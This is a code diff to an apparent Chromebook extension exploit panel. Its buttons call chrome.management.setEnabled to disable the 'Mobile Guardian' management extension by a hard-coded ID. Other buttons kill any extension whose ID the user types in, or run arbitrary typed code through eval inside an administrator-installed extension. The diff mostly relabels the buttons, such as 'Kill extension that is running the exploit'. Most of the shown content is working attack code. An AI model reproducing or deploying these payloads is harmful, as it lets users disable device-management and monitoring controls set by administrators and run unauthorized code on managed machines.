@@ -14,7 +14,7 @@ const managementTemplate = `
 <br>
 <button id="payload-6">Execute custom code</button>
 <br>
-<textarea id="codeeval" height="500" width="750" placeholder="code to eval"></textarea>
+<textarea id="codeeval" style="width:750px;height:500px;" placeholder="Code to evaluate"></textarea>
 <br><br>
 <p> Note that this only works on extensions installed by your administrator </p>
 <button id="payload-1">P1 test payload</button>
@@ -23,9 +23,9 @@ const managementTemplate = `
 <br>
 <button id="payload-3">P3 kill extension by id(manual input)</button>
 <br>
-<button id="payload-4">P4 get self id and alert</button>
+<button id="payload-4">P4 Get ID of extension that is running the exploit</button>
 <br>
-<button id="payload-5">P5 kill ext thats running injected code</button>
+<button id="payload-5">P5 Kill extension that is running the exploit (WILL CLOSE THE TAB)</button>
 </div>
 
 `; // TODO: Add CSS for this
@@ -334,19 +334,18 @@ onload = async function x() {
     // payload stuff :D
     container_extensions.querySelector("#payload-1").onclick =
       async function dx(e) {
-        alert("js works. p1 executed(nothing)");
+        alert("JS works on this extension! Yay :D");
       };
     container_extensions.querySelector("#payload-2").onclick =
       async function dx(e) {
-        alert("payload 2 executed");
+        alert("Kill 'Mobile Guardian'");
         chrome.management.setEnabled("fgmafhdohjkdhfaacgbgclmfgkgokgmb", false);
       };
     container_extensions.querySelector("#payload-3").onclick =
       async function dx(e) {
-        alert("payload 3 executed");
         var exttokill;
         while (!exttokill) {
-          exttokill = prompt("Extension id?");
+          exttokill = prompt("Extension to kill? (id)");
           if (exttokill === "cancel") {
             return;
           }
@@ -357,7 +356,6 @@ onload = async function x() {
       };
     container_extensions.querySelector("#payload-4").onclick =
       async function dx(e) {
-        alert("payload 4 executed");
         var alertcurrentid = chrome.runtime.id;
         alert(alertcurrentid);
       };
@@ -369,7 +367,6 @@ onload = async function x() {
       };
     container_extensions.querySelector("#payload-6").onclick =
       async function dx(e) {
-        alert("payload 6 executed");
         eval(document.getElementById("codeeval").value);
       };
   }
